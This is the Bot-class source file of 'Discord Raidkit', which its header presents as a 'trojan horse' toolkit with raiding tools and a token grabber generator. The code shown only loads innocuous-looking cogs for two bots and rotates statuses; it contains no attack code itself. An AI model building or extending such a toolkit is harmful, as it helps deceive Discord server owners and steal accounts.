"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

raider.py stores the Raider class used to manage Anubis and Qetesh.
raider.py was last updated on 05/03/23 at 20:47 UTC.
"""

import asyncio
import logging
from itertools import cycle

import aiohttp
import discord
from discord.errors import NotFound
from discord.ext import commands, tasks

from utils import clear_screen, menu_str, init_logger

init_logger()


class Raider(commands.Bot):
    """A class to handle the creation and usage of Anubis and Qetesh"""
    
    __slots__ = ['tool_id', 'session', 'prefix', 'statuses', 'initial_extensions']
    
    def __init__(self, tool_id: int, prefix: str, app_id: int, statuses: list | None):
        super().__init__(command_prefix = prefix, intents = discord.Intents.all(), 
                         application_id = app_id)
        self.initial_extensions = None
        self.tool_id = tool_id
        self.session = aiohttp.ClientSession()
        self.prefix = prefix
        self.remove_command('help')
        if statuses:
            self.statuses = cycle(statuses)
    
    async def setup_hook(self):
        """A hook to run after the bot has been setup."""
        match self.tool_id:
            case 1:
                self.initial_extensions = [
                    'cogs.anubis.moderation',
                    'cogs.anubis.raid_prevention',
                    'cogs.anubis.surfing',
                    'cogs.anubis.ahelp',
                    'cogs.shared.cmds',
                    'cogs.shared.handler'
                ]
            case 2:
                self.initial_extensions = [
                    'cogs.qetesh.nsfw',
                    'cogs.qetesh.qhelp',
                    'cogs.shared.cmds',
                    'cogs.shared.handler'
                ]
            case _:
                raise ValueError('Invalid tool ID provided')
        
        tasks = [self.load_extension(extension) for extension in self.initial_extensions]
        results = await asyncio.gather(*tasks, return_exceptions = True)

        for result in results:
            if isinstance(result, Exception):
                logging.error(f'Failed to load extension: {result}')
                raise result
    
    async def on_ready(self):
        try:
            await self.tree.sync()
        except NotFound:
            logging.error('The tree was not found; invalid application ID provided')
            raise SystemExit
        clear_screen()
        print(menu_str(self.prefix))
        if self.statuses:
            self.change_status.start()
    
    async def on_guild_join(self, guild):
        await self.tree.add_guild(guild)
    
    @tasks.loop(seconds=10)
    async def change_status(self):
        await self.change_presence(activity=discord.Game(next(self.statuses)))
    
    async def close(self):
        self.change_status.stop()
        await super().close()
        await self.session.close()
